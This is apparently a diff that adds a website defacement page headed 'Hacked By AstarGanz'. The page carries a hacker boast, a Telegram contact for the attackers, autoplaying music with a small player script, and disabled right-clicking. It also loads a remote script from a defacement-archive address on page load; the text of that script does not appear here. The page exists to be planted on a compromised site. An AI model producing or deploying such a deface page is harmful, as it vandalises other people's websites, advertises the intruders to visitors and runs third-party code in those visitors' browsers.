@@ -1,0 +1,164 @@
+<html>
+<head>
+	<title>Hacked By AstarGanz</title>
+	<link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
+	<meta name="description" content="Hacked">
+	<meta charset="utf-8">
+	<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
+	<style>
+		html,
+		body {
+			color: #000;
+			font-family: 'Rajdhani', sans-serif;
+			font-weight: 400;
+			height: 100vh;
+			margin: 0;
+			cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="red"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>') 12 12, auto;
+		}
+		.full-height {
+			height: 100vh
+		}
+		.flex-center {
+			align-items: center;
+			display: flex;
+			justify-content: center
+		}
+		.position-ref {
+			position: relative
+		}
+		.content {
+			text-align: center
+		}
+		.title {
+			font-size: 36px;
+			padding: 20px
+		}
+		h1 {
+			font-family: 'Orbitron', sans-serif;
+			font-weight: 900;
+			letter-spacing: 3px;
+		}
+		h2, h3 {
+			font-family: 'Rajdhani', sans-serif;
+			font-weight: 400;
+			letter-spacing: 1px;
+		}
+		a, button, .progress-bar {
+			cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="pink"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>') 12 12, pointer;
+		}
+		.music-control {
+			margin-top: 30px;
+			font-size: 14px;
+			color: #666;
+			font-family: 'Rajdhani', sans-serif;
+		}
+		.music-info {
+			margin-bottom: 15px;
+			font-size: 15px;
+		}
+		.progress-bar {
+			width: 300px;
+			height: 5px;
+			background: #ddd;
+			margin: 0 auto;
+			border-radius: 3px;
+			overflow: hidden;
+		}
+		.progress-fill {
+			height: 100%;
+			background: #000;
+			width: 0%;
+			transition: width 0.1s linear;
+		}
+		.time-display {
+			font-size: 13px;
+			color: #999;
+			margin-top: 8px;
+		}
+	</style>
+</head>
+<body align="center" oncontextmenu="return false" bgcolor="ffffff">
+	<div class="stars">
+		<div class="twinkling">
+			<div class="flex-center position-ref full-height">
+				<div class="content">
+					<div class="text">
+						<font color="#000000">
+							<img src="https://c.top4top.io/p_20661mc0d0.png" width="450px" heigt="450px">
+							<br><br>
+							<h1>&hearts; HACKED BY ASTARGANZ FT BBosCat&hearts;</h1>
+		 	 				<br>
+							<h2>~ Your Security Is Good, But It Can't Stop My Feelings For Her ~</h2>
+							<br><br>
+							<font size="3"><a href="https://t.me/ibarat1337" target="_blank" style="color: #0088cc; text-decoration: none;"><b>Telegram: @ibarat1337</b></a></font>
+							<br>
+							
+							<!-- Music Control -->
+							<div class="music-control">
+								<div class="music-info">♫ Now Playing: Pemuja Rahasia - Sheila On 7</div>
+								<div class="progress-bar" id="progressBar">
+									<div class="progress-fill" id="progressFill"></div>
+								</div>
+								<div class="time-display">
+									<span id="currentTime">0:00</span> / <span id="duration">0:00</span>
+								</div>
+							</div>
+							
+							<!-- Background Music -->
+							<audio autoplay loop id="bgMusic">
+								<source src="https://github.com/pengodehandal/botmusiktemanrandom/raw/refs/heads/main/Sheila%20On%207%20-%20Pemuja%20Rahasia%20(Lyric%20Video).mp3" type="audio/mpeg">
+							</audio>
+							<script type="text/javascript" src="https://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
+						</font>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		const music = document.getElementById('bgMusic');
+		const progressBar = document.getElementById('progressBar');
+		const progressFill = document.getElementById('progressFill');
+		const currentTimeEl = document.getElementById('currentTime');
+		const durationEl = document.getElementById('duration');
+		
+		// Set initial volume
+		music.volume = 0.7;
+		
+		// Format time (seconds to mm:ss)
+		function formatTime(seconds) {
+			const mins = Math.floor(seconds / 60);
+			const secs = Math.floor(seconds % 60);
+			return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+		}
+		
+		// Update duration when metadata loads
+		music.addEventListener('loadedmetadata', function() {
+			durationEl.textContent = formatTime(music.duration);
+		});
+		
+		// Update progress and time
+		music.addEventListener('timeupdate', function() {
+			const progress = (music.currentTime / music.duration) * 100;
+			progressFill.style.width = progress + '%';
+			currentTimeEl.textContent = formatTime(music.currentTime);
+		});
+		
+		// Click on progress bar to seek
+		progressBar.addEventListener('click', function(e) {
+			const rect = progressBar.getBoundingClientRect();
+			const clickX = e.clientX - rect.left;
+			const width = rect.width;
+			const percentage = clickX / width;
+			music.currentTime = music.duration * percentage;
+		});
+		
+		// Auto-play music workaround
+		document.addEventListener('click', function() {
+			if (music.paused) {
+				music.play().catch(e => console.log('Autoplay prevented'));
+			}
+		}, { once: true });
+	</script>
+</body>
+</html>
